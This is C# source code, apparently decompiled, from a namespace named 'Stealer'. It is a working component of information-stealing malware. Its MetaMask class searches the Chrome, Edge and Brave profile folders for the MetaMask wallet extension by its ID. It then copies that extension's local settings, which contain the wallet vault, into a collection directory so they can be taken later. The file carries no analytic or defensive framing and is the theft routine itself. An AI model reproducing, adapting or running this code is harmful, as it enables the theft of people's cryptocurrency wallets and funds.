using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.Devices;

namespace Stealer
{
	// Token: 0x02000002 RID: 2
	public class MetaMask
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
		public static void Meta(string SaveDir)
		{
			string text = "nkbihfbeogaeaoehlefnkodbefgpgknn";
			string[] array = new string[]
			{
				MetaMask.l_a + "\\Google\\Chrome\\User Data",
				MetaMask.l_a + "\\Microsoft\\Edge\\User Data",
				MetaMask.l_a + "\\BraveSoftware\\Brave-Browser\\User Data"
			};
			try
			{
				foreach (string text2 in array)
				{
					bool flag = Directory.Exists(text2);
					if (flag)
					{
						string text3 = text2.Split(new string[]
						{
							"\\"
						}, StringSplitOptions.RemoveEmptyEntries)[5].Replace("Microsoft", "Edge");
						foreach (string text4 in Directory.GetDirectories(text2))
						{
							bool flag2 = text4.Contains("\\Default") | text4.Contains("\\Profile");
							if (flag2)
							{
								bool flag3 = Directory.Exists(text4 + "\\Local Extension Settings\\" + text);
								if (flag3)
								{
									try
									{
										bool flag4 = !Directory.Exists(SaveDir);
										if (flag4)
										{
											Directory.CreateDirectory(SaveDir);
										}
									}
									catch (Exception ex)
									{
										Debug.WriteLine(ex.Message);
									}
									Directory.CreateDirectory(SaveDir + "\\" + text3);
									Directory.CreateDirectory(string.Concat(new string[]
									{
										SaveDir,
										"\\",
										text3,
										"\\",
										Path.GetFileName(text4)
									}));
									MetaMask.PC.FileSystem.CopyDirectory(text4 + "\\Local Extension Settings\\" + text, string.Concat(new string[]
									{
										SaveDir,
										"\\",
										text3,
										"\\",
										Path.GetFileName(text4),
										"\\",
										text
									}), true);
								}
							}
						}
					}
				}
			}
			catch (Exception ex2)
			{
				Debug.WriteLine(ex2.Message);
			}
		}

		// Token: 0x04000001 RID: 1
		public static string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x04000002 RID: 2
		public static string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000003 RID: 3
		private static readonly Computer PC = new Computer();
	}
}
